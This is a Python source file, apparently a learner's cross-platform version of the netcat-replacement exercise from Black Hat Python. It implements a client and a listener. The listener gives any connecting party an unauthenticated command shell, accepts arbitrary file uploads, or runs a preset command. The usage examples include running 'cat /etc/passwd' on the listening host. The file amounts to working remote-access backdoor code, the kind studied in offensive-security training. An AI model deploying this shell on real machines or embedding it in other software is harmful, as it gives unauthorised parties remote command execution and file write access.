# Based off of the Replacing Netcat section from Black Hat Python 2nd Edition Chapter 2, Pages 13-19
# Updated to work with both Unix and Windows.
# --- Netenvy ---

import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    """
    Executes a command on the local operating system.
    This function is cross-platform.
    """
    cmd = cmd.strip()
    if not cmd:
        return ""

    # Correctly handles command parsing for different operating systems
    if sys.platform.startswith('win'):
        # On Windows, use shell=True and pass the command as a single string
        # This is necessary for built-in commands like 'dir' or 'type'
        # The 'decode' is a bit safer here as 'shell=True' on windows can change the output encoding slightly
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    else:
        # On Linux/macOS, use shlex.split() to safely handle arguments
        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)

    return output.decode()

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)

        try:
            while True:
                response = ''
                while True:
                    data = self.socket.recv(4096)
                    response += data.decode()
                    if len(data) < 4096:
                        break

                if response:
                    print(response, end='')

                buffer = input('')
                buffer += '\n'
                self.socket.send(buffer.encode())

        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()

    def handle(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break

            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)

            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'NETENVY: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)

                    # Command execution is now isolated
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())

                    cmd_buffer = b''
                except subprocess.CalledProcessError as e:
                    # If a command fails, send the error back to the client and keep the shell alive.
                    error_message = f"Command failed: {e.output.decode()}"
                    client_socket.send(error_message.encode())
                    cmd_buffer = b''
                except Exception as e:
                    # For a critical error, disconnect.
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Netenvy by Roadbobek',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example: 2
 netenvy.py -t 192.168.1.108 -p 5555 -l -c # command shell
 netenvy.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
 netenvy.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
 echo 'ABC' | ./netenvy.py -t 192.168.1.108 -p 135 # echo text to server port 135
 netenvy.py -t 192.168.1.108 -p 5555 # connect to server
 '''))
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()

    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()
